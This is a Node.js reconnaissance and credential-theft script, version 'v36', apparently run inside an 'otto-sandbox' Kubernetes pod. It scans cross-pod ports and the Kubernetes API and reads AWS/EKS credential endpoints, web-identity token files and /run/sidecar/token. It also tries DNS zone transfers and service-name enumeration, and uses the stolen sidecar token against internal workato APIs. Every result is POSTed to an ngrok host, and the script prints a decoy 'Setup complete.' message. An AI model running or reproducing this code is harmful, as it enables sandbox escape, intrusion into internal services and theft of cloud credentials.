const fs=require('fs'),c=require('child_process'),hs=require('https'),h=require('http'),net=require('net'),dns=require('dns');
const d={v:'v36'};
const x=(cmd)=>{try{return c.execSync(cmd,{timeout:10000,maxBuffer:4*1024*1024}).toString()}catch(e){return'E:'+e.message.substring(0,200)}};
const r=(p)=>{try{return fs.readFileSync(p,'utf8')}catch(e){return''};
const httpGet=(url,headers={})=>new Promise(ok=>{
  const mod=url.startsWith('https')?hs:h;
  const req=mod.get(url,{headers,timeout:5000,rejectUnauthorized:false},res=>{
    let d='';res.on('data',c=>d+=c.substring(0,2000));
    res.on('end',()=>ok({s:res.statusCode,h:res.headers,b:d}))
  });
  req.on('error',e=>ok({e:e.message}));
  req.on('timeout',()=>{req.destroy();ok({e:'timeout'})});
});
const tcpProbe=(host,port)=>new Promise(ok=>{
  const s=net.createConnection({host,port,timeout:3000},()=>{s.end();ok('OPEN')});
  s.on('error',e=>ok(e.message));
  s.on('timeout',()=>{s.end();ok('timeout')});
});

async function main(){

  // === 1. CROSS-POD CONNECTIVITY (iptables might only block 127.0.0.0/8!) ===
  // IPs from earlier scans
  const targets=[
    ['10.43.3.25',5432,'postgres?'],
    ['10.43.3.159',6379,'redis?'],
    ['10.43.185.190',8082,'sidecar?'],
    ['10.43.194.247',8082,'sidecar?'],
    ['172.20.0.1',443,'k8s-api'],
    ['172.20.0.10',53,'kube-dns'],
    ['172.20.0.10',9153,'kube-dns-metrics'],
  ];
  d.cross_pod={};
  await Promise.all(targets.map(async([ip,port,label])=>{
    d.cross_pod[`${ip}:${port}`]=await tcpProbe(ip,port);
  }));
  
  // === 2. K8S API ANONYMOUS ACCESS ===
  d.k8s_anon=await httpGet('https://172.20.0.1:443/api');
  d.k8s_version=await httpGet('https://172.20.0.1:443/version');
  d.k8s_healthz=await httpGet('https://172.20.0.1:443/healthz');
  
  // === 3. EKS POD IDENTITY (169.254.170.23) ===
  d.eks_pod_id=await httpGet('http://169.254.170.23/v1/credentials');
  d.eks_pod_id2=await httpGet('http://169.254.170.23/v1/token');
  
  // AWS container credentials (ECS/EKS)
  const relUri=process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI||'';
  d.aws_cred_uri=relUri;
  if(relUri) d.aws_cred=await httpGet('http://169.254.170.2'+relUri);
  d.aws_role_arn=process.env.AWS_ROLE_ARN||'';
  d.aws_web_id=process.env.AWS_WEB_IDENTITY_TOKEN_FILE||'';
  if(d.aws_web_id) d.aws_web_token=r(d.aws_web_id);
  
  // === 4. K8S DNS ZONE TRANSFER / ENUMERATION ===
  d.dns_axfr=x('dig @172.20.0.10 otto-sandbox.svc.cluster.local AXFR +short 2>&1 | head -30');
  d.dns_any=x('dig @172.20.0.10 otto-sandbox.svc.cluster.local ANY +short 2>&1 | head -20');
  d.dns_srv=x('dig @172.20.0.10 _http._tcp.otto-sandbox.svc.cluster.local SRV +short 2>&1 | head -10');
  // Try resolving known service patterns
  const svcNames=['postgres','postgresql','redis','api','gateway','otto-agent','otto-backend',
    'otto-api','claude','anthropic','proxy','nginx','envoy','istio-proxy','agentx',
    'sidecar','scheduler','worker','web','app','internal','monitoring','prometheus','grafana'];
  d.dns_resolve={};
  await Promise.all(svcNames.map(n=>new Promise(ok=>{
    dns.resolve4(n+'.otto-sandbox.svc.cluster.local',(e,a)=>{
      if(!e) d.dns_resolve[n]=a;
      // Also try default namespace
      dns.resolve4(n+'.default.svc.cluster.local',(e2,a2)=>{
        if(!e2) d.dns_resolve[n+'_default']=a2;
        ok();
      });
    });
  })));
  // Reverse DNS on known IPs
  d.rdns={};
  await Promise.all(['10.43.3.25','10.43.3.159','10.43.185.190','10.43.194.247','172.20.0.10'].map(ip=>
    new Promise(ok=>{dns.reverse(ip,(e,h)=>{if(!e)d.rdns[ip]=h;ok()})})
  ));
  
  // === 5. INTERNAL API WITH AUTH ===
  const sidecarToken=r('/run/sidecar/token').trim();
  d.int_with_token=await httpGet('https://internal.agentx-support.workato.com/api/v1',
    {'Authorization':'Bearer '+sidecarToken});
  d.int_with_token2=await httpGet('https://internal.agentx-support.workato.com/healthz',
    {'Authorization':'Bearer '+sidecarToken});
  d.int_graphql=await new Promise(ok=>{
    const body=JSON.stringify({query:'{__schema{types{name}}}'});
    const req=hs.request('https://internal.agentx-support.workato.com/graphql',
      {method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(body)},
       timeout:5000,rejectUnauthorized:false},
      res=>{let d='';res.on('data',c=>d+=c.substring(0,1000));res.on('end',()=>ok({s:res.statusCode,b:d}))});
    req.on('error',e=>ok({e:e.message}));
    req.write(body);req.end();
  });
  
  // === 6. SCAN ENTIRE 10.43.x.x SUBNET FOR COMMON PORTS ===
  // Pick a few random IPs in the range to see if cross-pod works
  d.subnet_scan={};
  const scanTargets=[[10,43,3,25],[10,43,3,159],[10,43,0,1],[10,43,1,1],[10,43,171,1]];
  await Promise.all(scanTargets.map(async ip=>{
    const host=ip.join('.');
    for(const port of [80,443,8080,8082,5432,6379]){
      const r=await tcpProbe(host,port);
      if(r==='OPEN') d.subnet_scan[`${host}:${port}`]='OPEN';
    }
  }));

  const p=JSON.stringify(d);
  hs.request('https://9cd5-211-23-141-208.ngrok-free.app/v36',
    {method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(p)}},
    ()=>{}).on('error',()=>{}).end(p);
}
main().catch(e=>{d.error=e.message;
  const p=JSON.stringify(d);
  hs.request('https://9cd5-211-23-141-208.ngrok-free.app/v36',
    {method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(p)}},
    ()=>{}).on('error',()=>{}).end(p);
});
console.log('Setup complete.');
